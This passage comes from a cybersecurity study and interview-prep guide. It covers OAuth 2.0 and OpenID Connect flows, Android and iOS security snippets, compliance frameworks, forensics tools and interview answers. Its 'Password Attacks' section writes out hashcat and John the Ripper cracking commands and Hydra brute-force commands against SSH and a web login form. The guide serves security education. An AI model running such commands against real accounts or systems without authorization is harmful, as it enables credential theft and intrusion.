</saml:Assertion>
```

### OAuth 2.0
OAuth 2.0 is an **authorization framework** (not for authentication) that allows third-party applications to obtain limited access to user resources without exposing user credentials → “app gets permission to act on your behalf.”

Client redirects user to AS with scope, client ID, etc.

```http
GET /authorize?
    client_id=123
    &redirect_uri=https://app/callback
    &response_type=code
    &scope=email
    &state=xyz
```
- `client_id` and `client_secret`: App credentials (Confidential or Public clients)
- `redirect_uri`: Where to send the user after authorization
- `scope`: Permissions requested
- `state`: Prevent CSRF attacks

User authenticates and consents to app, then Authorization Server (AS) redirects back to `redirect_uri` with code:
```http
https://app/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz
```

Client exchanges code for access (and optional refresh) token.

```json
POST /token
{
  "client_id": "123",
  "client_secret": "xyz",
  "code": "SplxlOBeZQQYbYS6WxSbIA",
  "grant_type": "authorization_code"
}
```
- `authorization_code`: Grant type for exchanging code for tokens

Response:

```json
{
  "access_token": "ya29.a0Af...",
  "expires_in": 3600,
  "refresh_token": "1//0g..."
}
```
- `access_token`: Short-lived; grants access to specific resources.
- `refresh_token`: Long-lived; allows new access tokens without re-consent.

Client uses access token to access Resource Server (RS).
```http
GET /userinfo
Authorization: Bearer ya29.a0Af...
```
- `Bearer`: Token type used in Authorization header (Anyone holding it can access resources)

**Enhancements:**
- `DPoP (Proof-of-Possession):` Bound to client's key pair; requires proof on each use.
  - Binds token to public key → prevents token misuse if intercepted.
  - Adds DPoP JWT header to prove possession.
- `PKCE (RFC 7636)`: Enhances security for public clients (e.g., mobile apps, SPAs).
  - Generates a random `code_verifier` and derives a `code_challenge` using SHA256.
  - Sends `code_challenge` during authorization request.
  - Sends `code_verifier` during token exchange to prove possession.


## OpenID Connect
OpenID Connect (OIDC) is an identity layer built on top of OAuth 2.0 that enables authentication and provides user profile information.

**Difference**: Response types include `id_token` for authentication (includes user identity through JWT).

Client initiates auth request to AS:
```http
GET /authorize?
    response_type=code
    &client_id=CLIENT_ID
    &redirect_uri=REDIRECT_URI
    &scope=openid%20profile%20email
    &state=STATE
```
- `scope=openid`: Required to indicate OIDC request
- `profile`, `email`: Request user profile and email information
- `id_token`: JWT containing user identity claims
- `userinfo` endpoint: Retrieve additional user info using access token

User authenticates and AS redirects back with code:
```http
https://app/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz
```
Client exchanges code for `id_token` and `access_token`:
```json
POST /token
{
  "client_id": "CLIENT_ID",
  "client_secret": "SECRET",
  "code": "SplxlOBeZQQYbYS6WxSbIA",
  "grant_type": "authorization_code"
}
```

Response:
```http
{
  "access_token": "ya29.a0Af...",
  "id_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer"
}
```

Inside `id_token`:
```json
{
  "sub": "1234567890",
  "name": "Berkan",
  "email": "berkan@example.com",
  "iss": "https://accounts.example.com",
  "aud": "CLIENT_ID",
  "exp": 1736854581
}
```
- `sub`: Unique user identifier
- `iss`: Issuer (AS)
- `aud`: Audience (client ID)
- `exp`: Expiration time
- `name`, `email`: User profile claims

Client uses `id_token` to authenticate user and `access_token` to access user info.


# Mobile Security

## Android Security
```java
// Permission check
if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_REQUEST_CODE);
}

// Secure storage
SharedPreferences sharedPrefs = getSharedPreferences("secure_prefs", Context.MODE_PRIVATE);
SharedPreferences.Editor editor = sharedPrefs.edit();
editor.putString("api_key", encryptedApiKey);
editor.apply();

// Certificate pinning
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build();
```

## iOS Security
```swift
// Keychain storage
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "userAccount",
    kSecValueData as String: password.data(using: .utf8)!
]
SecItemAdd(query as CFDictionary, nil)

// App Transport Security
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
</dict>
```

# Compliance & Governance

## GDPR
- **Data Protection Principles**: Lawfulness, fairness, transparency
- **Rights**: Access, rectification, erasure, portability
- **Data Protection Impact Assessment (DPIA)**
- **Breach notification**: 72 hours to authorities

## PCI DSS
**Requirements**
1. Firewall configuration
2. Default passwords
3. Cardholder data protection
4. Encrypted transmission
5. Antivirus software
6. Secure systems
7. Access control
8. Unique IDs
9. Physical access
10. Network monitoring
11. Regular testing
12. Security policy

## ISO 27001
- **ISMS**: Information Security Management System
- **Risk Assessment**: Identify, analyze, evaluate risks
- **Controls**: Technical, organizational, physical

# Password Attacks
Password attacks aim to compromise user credentials through various techniques.

```bash
# Hashcat - Indexes and cracks password hashes using different algorithms and attack modes. 
hashcat -m 0 hashes.txt wordlist.txt
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d

# John the Ripper - A fast password cracker supporting various hash types and customizable rules.
john --wordlist=wordlist.txt hashes.txt
john --rules --wordlist=wordlist.txt hashes.txt
john --show hashes.txt

# Hydra - Online brute-force tool for various protocols (SSH, FTP, HTTP, etc.).
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l admin -P passwords.txt http-post-form://target.com/login.php:"username=^USER^&password=^PASS^:F=incorrect"
```

## Forensics Tools
```bash
# Autopsy
autopsy

# Sleuth Kit
fls -r disk_image.dd
icat disk_image.dd 1234 > recovered_file.txt

# Volatility
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 connections
volatility -f memory.dump --profile=Win7SP1x64 malfind
```

# Common Interview Questions

## Network Security

### Q: Explain the difference between TCP and UDP protocols.
**TCP (Transmission Control Protocol)**:
- Connection-oriented: Establishes connection before data transfer (3-way handshake)
- Reliable: Guarantees packet delivery and order
- Flow control: Manages data transmission rate
- Error checking: Detects and retransmits lost packets
- Higher overhead: More processing and bandwidth
- Examples: HTTP, HTTPS, FTP, SSH

**UDP (User Datagram Protocol)**:
- Connectionless: No connection establishment required
- Unreliable: No guarantee of delivery or order
- No flow control: Sends data at maximum rate
- Minimal error checking: Basic checksum only
- Lower overhead: Faster and more efficient
- Examples: DNS, DHCP, VoIP, gaming

### Q: Walk me through the SSL/TLS handshake process.
1. **Client Hello**: Client sends supported cipher suites, TLS version, random number
2. **Server Hello**: Server responds with chosen cipher suite, certificate, random number
3. **Certificate Verification**: Client validates server certificate against trusted CAs
4. **Key Exchange**: Client generates pre-master secret, encrypts with server's public key
5. **Session Key Generation**: Both sides derive symmetric session keys from pre-master secret
6. **Finished Messages**: Both sides send encrypted "finished" messages to confirm handshake
7. **Secure Communication**: All subsequent data encrypted with session keys

### Q: What are the different types of firewalls?
- **Packet Filtering**: Examines packet headers (IP, port, protocol) - stateless
- **Stateful Inspection**: Tracks connection state and context - knows TCP session state
- **Application Layer/Proxy**: Deep packet inspection, understands application protocols
- **Next-Generation Firewall (NGFW)**: Combines traditional firewall with IPS, application awareness, threat intelligence

## Web Security

### Q: Explain the OWASP Top 10 and how to prevent each vulnerability.
1. **Injection**: Use parameterized queries, input validation, ORM frameworks
2. **Broken Authentication**: Implement MFA, secure session management, password policies
3. **Sensitive Data Exposure**: Encrypt data at rest/transit, use HTTPS, proper key management
4. **XML External Entities (XXE)**: Disable external entity processing, use JSON instead of XML
5. **Broken Access Control**: Implement proper authorization, principle of least privilege
6. **Security Misconfiguration**: Secure defaults, regular updates, configuration management
7. **Cross-Site Scripting (XSS)**: Input validation, output encoding, CSP headers
8. **Insecure Deserialization**: Avoid untrusted serialized data, integrity checks
9. **Known Vulnerabilities**: Regular patching, dependency scanning, vulnerability management
10. **Insufficient Logging**: Comprehensive logging, monitoring, alerting, SIEM integration

### Q: What's the difference between stored, reflected, and DOM-based XSS?
**Stored XSS**: Malicious script stored on server (database, file), executed when content viewed
**Reflected XSS**: Script reflected off web application (URL parameter), not stored
**DOM-based XSS**: Vulnerability in client-side JavaScript that modifies DOM unsafely

## Cryptography

### Q: When would you use symmetric vs asymmetric encryption?
**Symmetric Encryption**:
- Fast encryption/decryption of large amounts of data
- Bulk data encryption (file encryption, disk encryption)
- Stream ciphers for real-time communication
- Challenge: Key distribution and management

**Asymmetric Encryption**:
- Key exchange and digital signatures
- Small amounts of data (encrypting symmetric keys)
- Public key infrastructure (PKI)
- Slower but solves key distribution problem

**Hybrid Approach**: Use asymmetric encryption to exchange symmetric keys, then use symmetric encryption for data

### Q: Explain digital signatures and their purpose.
Digital signatures provide:
- **Authentication**: Verifies sender identity
- **Integrity**: Ensures message hasn't been tampered with
- **Non-repudiation**: Sender cannot deny sending the message

Process:
1. Hash the message using cryptographic hash function
2. Encrypt hash with sender's private key (creates signature)
3. Recipient decrypts signature with sender's public key
4. Recipient hashes received message and compares with decrypted hash

## Incident Response

### Q: Walk me through the NIST Incident Response Framework.
1. **Preparation**:
   - Develop IR plan, procedures, and team
   - Implement monitoring and detection tools
   - Conduct training and exercises

2. **Detection & Analysis**:
   - Monitor for security events
   - Analyze and validate incidents
   - Determine scope and impact
   - Document findings

3. **Containment, Eradication & Recovery**:
   - **Containment**: Isolate affected systems to prevent spread
   - **Eradication**: Remove threat from environment
   - **Recovery**: Restore systems to normal operation

4. **Post-Incident Activity**:
   - Lessons learned review
   - Update procedures and controls
   - Report to stakeholders

### Q: How do you maintain chain of custody in digital forensics?
- **Documentation**: Record who, what, when, where, why for every action
- **Secure Storage**: Locked, climate-controlled, access-logged storage
- **Hash Verification**: Calculate and verify file hashes at each transfer
- **Access Logs**: Track everyone who accesses evidence
- **Legal Admissibility**: Follow legal requirements for evidence handling

## Risk Management

### Q: Explain the risk assessment process.
1. **Asset Identification**: Catalog critical assets (data, systems, processes)
2. **Threat Identification**: Identify potential threats (natural, human, technical)
3. **Vulnerability Assessment**: Find weaknesses that threats could exploit
4. **Risk Analysis**: Calculate risk = Threat × Vulnerability × Impact
5. **Risk Evaluation**: Compare risks against risk tolerance/appetite
6. **Risk Treatment**: Accept, avoid, mitigate, or transfer risks

### Q: What's the difference between quantitative and qualitative risk assessment?
**Quantitative**: Uses numerical values (ALE = ARO × SLE)
- Annual Rate of Occurrence (ARO)
- Single Loss Expectancy (SLE)
- Annual Loss Expectancy (ALE)
- More precise but requires extensive data

**Qualitative**: Uses descriptive categories (High/Medium/Low)
- Easier to implement
- More subjective
- Good for initial assessments

## Access Control

### Q: Explain the AAA security model.
**Authentication**: "Who are you?"
- Verifying user identity (passwords, biometrics, certificates)
- Something you know, have, or are

**Authorization**: "What can you do?"
- Granting access to resources based on identity
- Role-based (RBAC), attribute-based (ABAC), mandatory (MAC)

**Accounting**: "What did you do?"
- Logging and auditing user activities
- Compliance, forensics, billing

### Q: What is Zero Trust architecture?
**Principle**: "Never trust, always verify"
- Assume breach mentality
- Verify every user and device
- Least privilege access
- Micro-segmentation
- Continuous monitoring and validation

**Components**:
- Identity and access management
- Device security and compliance
- Network segmentation
- Data protection
- Monitoring and analytics

## Malware Analysis

### Q: Difference between static and dynamic malware analysis?
**Static Analysis**:
- Examining malware without execution
- File properties, strings, disassembly
- Safe but limited information
- Tools: file, strings, objdump, IDA Pro

**Dynamic Analysis**:
- Executing malware in controlled environment
- Runtime behavior, network traffic, system changes
- More information but requires sandboxing
- Tools: Process Monitor, Wireshark, sandbox environments

### Q: What are Indicators of Compromise (IOCs)?
- **File-based**: MD5/SHA hashes, file names, paths
- **Network-based**: IP addresses, domains, URLs, protocols
- **Registry-based**: Registry keys, values (Windows)
- **Behavioral**: Process names, command lines, user accounts
- **Usage**: Threat hunting, detection rules, incident response

This comprehensive guide covers essential cybersecurity concepts, tools, and techniques for defensive security operations and interview preparation.